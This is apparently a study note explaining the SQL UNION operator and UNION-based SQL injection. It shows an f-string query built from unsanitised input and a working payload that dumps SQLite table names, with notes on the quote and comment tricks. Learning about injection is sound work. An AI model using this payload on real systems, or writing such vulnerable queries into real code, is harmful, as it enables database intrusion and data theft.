DESCRIPTION:

 * `UNION` operator:
    * **UNION** operator allow to have two or more **SELECT** statements in a query
    * **UNION** operator executes each **SELECT** statement sequentially, and combine those result sets
    * **REQUIREMENTS**: every **SELECT** statement must match the *number* of columns, the *data types* of columns, *order* of columns from the FIRST **SELECT** statement

      Example:
      ```asm
      # table(INT, TEXT, TEXT)
      SELECT id, name, description
      FROM table1
      WHERE name LIKE '%1' 
      UNION
      SELECT id2, name2, description2
      FROM table2
      WHERE name LIKE '%2' 
      ```
 * `UNION` injection:
   * **UNION** injection when server takes user input as parameter for embedded SQL statement, and the input isnt sanitized
     
     Example: `{q}` is a placeholder replaced with user request
     ```asm
     sql = f"SELECT id, name, description FROM products WHERE name LIKE '%{q}%'"
     ```
   * **UNION** injection, therefore locates at the second clause (2nd **SELECT** statement) and so on
     
      Example: *UNION Injection code* and *injected SQL query*
      ```sql
      ' UNION SELECT 1, group_concat(name, ';'), 3 
        FROM sqlite_master 
        WHERE type='table' -- 
      ```
      ```sql
      SELECT id, name, description 
      FROM products 
      WHERE name LIKE '%`
      UNION 
      SELECT 1, group_concat(name, ';'), 3  # exploit 
      FROM sqlite_master 
      WHERE type='table';
      ```
      With:
     
        * `'` to closes the placeholder in code
     
        * `--` to comment out the initial placeholder's closing mark
